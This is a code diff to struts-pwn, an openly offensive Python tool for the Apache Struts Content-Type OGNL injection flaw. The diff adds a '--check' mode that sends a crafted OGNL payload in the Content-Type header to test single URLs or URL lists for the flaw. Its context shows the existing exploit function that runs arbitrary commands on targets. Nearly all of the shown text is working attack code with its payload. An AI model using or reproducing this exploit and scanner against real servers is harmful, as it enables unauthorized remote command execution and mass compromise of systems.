@@ -6,8 +6,10 @@
 # Mazin Ahmed <Mazin AT MazinAhmed DOT net>
 # This code is based on:
 # https://www.exploit-db.com/exploits/41570/
+# https://www.seebug.org/vuldb/ssvid-92746
 # *****************************************************
 import sys
+import random
 import requests
 import argparse
 
@@ -38,11 +40,16 @@ parser.add_argument("-c", "--cmd",
                     help="Command to execute. (Default: id)",
                     action='store',
                     default='id')
+parser.add_argument("--check",
+                    dest="do_check",
+                    help="Check if a target is vulnerable.",
+                    action='store_true')
 args = parser.parse_args()
 url = args.url if args.url else None
 usedlist = args.usedlist if args.usedlist else None
 url = args.url if args.url else None
 cmd = args.cmd if args.cmd else None
+do_check = args.do_check if args.do_check else None
 
 
 def url_prepare(url):
@@ -92,10 +99,46 @@ def exploit(url, cmd):
     return(output)
 
 
-def main(url=url, usedlist=usedlist, cmd=cmd):
+def check(url):
+    url = url_prepare(url)
+    print('\n[*] URL: %s' % (url))
+
+    random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))
+
+    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
+    payload += "addHeader('%s','%s')}.multipart/form-data" % (random_string, random_string)
+    headers = {
+        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn)',
+        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
+        'Content-Type': str(payload),
+        'Accept': '*/*'
+    }
+
+    timeout = 3
+    try:
+        resp = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
+        if ((random_string in resp.headers.keys()) and (resp.headers[random_string] == random_string)):
+            result = True
+        else:
+            result = False
+    except Exception as e:
+        print("EXCEPTION::::--> " + str(e))
+        result = False
+    return(result)
+
+
+def main(url=url, usedlist=usedlist, cmd=cmd, do_check=do_check):
     if url:
-        exploit_output = exploit(url, cmd)
-        print(exploit_output)
+        if do_check:
+            result = check(url)  # Only check for existence of Vulnerablity
+            output = '[*] Status: '
+            if result is True:
+                output += 'Vulnerable!'
+            else:
+                output += 'Not Affected.'
+        else:
+            output = exploit(url, cmd)  # Exploit
+        print(output)
 
     if usedlist:
         URLs_List = []
@@ -111,14 +154,22 @@ def main(url=url, usedlist=usedlist, cmd=cmd):
             print('Error: There was an error in reading list file.')
             exit(1)
         for url in URLs_List:
-            exploit_output = exploit(url, cmd)
-            print(exploit_output)
+            if do_check:
+                result = check(url)  # Only check for existence of Vulnerablity
+                output = '[*] Status: '
+                if result is True:
+                    output += 'Vulnerable!'
+                else:
+                    output += 'Not Affected.'
+            else:
+                output = exploit(url, cmd)  # Exploit
+            print(output)
 
     print('[%] Done.')
 
 if __name__ == '__main__':
     try:
-        main(url=url, usedlist=usedlist, cmd=cmd)
+        main(url=url, usedlist=usedlist, cmd=cmd, do_check=do_check)
     except KeyboardInterrupt:
         print('\nKeyboardInterrupt Detected.')
         print('Exiting...')
